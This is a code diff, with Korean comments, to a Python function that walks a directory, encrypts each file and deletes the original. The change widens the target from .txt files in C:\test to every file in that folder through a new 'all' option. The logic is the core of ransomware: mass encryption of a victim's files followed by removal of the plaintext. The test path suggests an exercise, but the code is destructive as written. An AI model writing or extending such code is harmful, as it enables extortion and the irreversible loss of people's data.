@@ -41,7 +41,7 @@ def search_and_encrypt_files(key):
     @return : 성공과 실패 여부
     """
 
-    def search_file(directory:str, extension:list):
+    def search_file(directory:str, *extension:tuple[str]):
         """
         @breif : 주어진 디렉토리 내에서 특정 확장자를 가진 모든 파일을 탐색합니다.
         @param directory : 탐색할 디렉토리의 경로
@@ -51,8 +51,11 @@ def search_and_encrypt_files(key):
         files_found = []
         for root, dirs, files in os.walk(directory):
             for file in files:
-                if file.endswith(extension):
+                if "all" in extension:
                     files_found.append(os.path.join(root, file))
+                else:
+                    if file.endswith(tuple(extension)):
+                        files_found.append(os.path.join(root, file))
         return files_found
     
     def encrypt_file(filename):
@@ -68,7 +71,7 @@ def search_and_encrypt_files(key):
         os.remove(filename)
         return
 
-    files=search_file("C:\\test",".txt")
+    files=search_file("C:\\test","all")
     for file in files:
         encrypt_file(file)
         
